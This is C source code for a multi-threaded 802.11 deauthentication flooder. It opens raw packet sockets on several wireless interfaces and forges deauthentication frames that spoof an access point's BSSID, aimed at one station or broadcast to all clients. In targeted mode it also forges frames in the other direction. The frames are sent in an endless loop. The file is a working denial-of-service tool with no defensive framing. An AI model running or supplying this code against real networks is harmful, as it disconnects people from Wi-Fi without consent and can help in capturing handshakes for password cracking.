#include "deauth_engine_v2.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <pthread.h>

static int _open_iface(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

typedef struct {
    DeauthEngineV2* eng;
    int idx;
    int fd;
} ThreadArg;

static void _build_frame(uint8_t* frame, const uint8_t* bssid, const uint8_t* station, uint16_t reason, uint16_t seq) {
    memset(frame, 0, 38);
    frame[0]=0x00; frame[1]=0x00; frame[2]=0x0C; frame[3]=0x00;
    frame[4]=0x02; frame[5]=0x00; frame[6]=0x00; frame[7]=0x00;
    frame[8]=0x00;
    frame[12]=0xC0; frame[13]=0x00;
    frame[14]=0x3A; frame[15]=0x01;
    memcpy(&frame[16], station, 6);
    memcpy(&frame[22], bssid, 6);
    memcpy(&frame[28], bssid, 6);
    frame[34]=(uint8_t)((seq<<4)&0xFF);
    frame[35]=(uint8_t)(((seq<<4)>>8)&0xFF);
    frame[36]=(uint8_t)(reason&0xFF);
    frame[37]=(uint8_t)((reason>>8)&0xFF);
}

static void* _thread_send(void* arg) {
    ThreadArg* ta = (ThreadArg*)arg;
    DeauthEngineV2* eng = ta->eng;
    uint16_t seq = 0;

    while (eng->running) {
        uint8_t frame[38];
        _build_frame(frame, eng->bssid, eng->station, eng->reason, seq);
        seq = (seq + 1) & 0xFFF;

        if (send(ta->fd, frame, 38, 0) > 0)
            __sync_fetch_and_add(&eng->total_sent, 1);

        if (eng->targeted) {
            _build_frame(frame, eng->station, eng->bssid, eng->reason, seq);
            seq = (seq + 1) & 0xFFF;
            if (send(ta->fd, frame, 38, 0) > 0)
                __sync_fetch_and_add(&eng->total_sent, 1);
        }
    }
    return NULL;
}

DeauthEngineV2* deauth_v2_create(const char* ifaces[], int count, const char* bssid, const char* station, uint16_t reason) {
    DeauthEngineV2* eng = calloc(1, sizeof(DeauthEngineV2));
    if (!eng) return NULL;
    eng->iface_count = count > DEAUTH_V2_MAX_IFACES ? DEAUTH_V2_MAX_IFACES : count;
    eng->reason = reason;
    eng->running = 1;
    unsigned int b[6], s[6];
    if (sscanf(bssid, "%02x:%02x:%02x:%02x:%02x:%02x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6)
        for (int i=0;i<6;i++) eng->bssid[i] = (uint8_t)b[i];
    if (station && sscanf(station, "%02x:%02x:%02x:%02x:%02x:%02x", &s[0],&s[1],&s[2],&s[3],&s[4],&s[5]) == 6)
        for (int i=0;i<6;i++) eng->station[i] = (uint8_t)s[i];
    else
        memset(eng->station, 0xFF, 6);
    eng->targeted = memcmp(eng->station, "\xff\xff\xff\xff\xff\xff", 6) != 0;

    for (int i = 0; i < eng->iface_count; i++) {
        eng->ifaces[i].name = strdup(ifaces[i]);
        eng->ifaces[i].fd = _open_iface(ifaces[i]);
        eng->ifaces[i].channel = 0;
    }
    return eng;
}

int deauth_v2_run(DeauthEngineV2* eng) {
    pthread_t threads[DEAUTH_V2_MAX_IFACES];
    ThreadArg args[DEAUTH_V2_MAX_IFACES];
    int n = 0;

    for (int i = 0; i < eng->iface_count; i++) {
        if (eng->ifaces[i].fd < 0) continue;
        args[n] = (ThreadArg){.eng=eng, .idx=i, .fd=eng->ifaces[i].fd};
        pthread_create(&threads[n], NULL, _thread_send, &args[n]);
        n++;
    }

    fprintf(stderr, "[C-v2] Deauth on %d interfaces, Ctrl+C to stop\n", n);

    while (eng->running) {
        sleep(1);
        fprintf(stderr, "\r[C-v2] Total: %lld frames across %d ifaces",
                eng->total_sent, n);
    }

    for (int i = 0; i < n; i++) pthread_join(threads[i], NULL);
    for (int i = 0; i < eng->iface_count; i++) {
        if (eng->ifaces[i].fd >= 0) close(eng->ifaces[i].fd);
        free((void*)eng->ifaces[i].name);
    }
    return eng->total_sent > 0 ? 0 : -1;
}

void deauth_v2_stop(DeauthEngineV2* eng) { if (eng) eng->running = 0; }
long long deauth_v2_total(const DeauthEngineV2* eng) { return eng ? eng->total_sent : 0; }
void deauth_v2_destroy(DeauthEngineV2* eng) { if (eng) free(eng); }
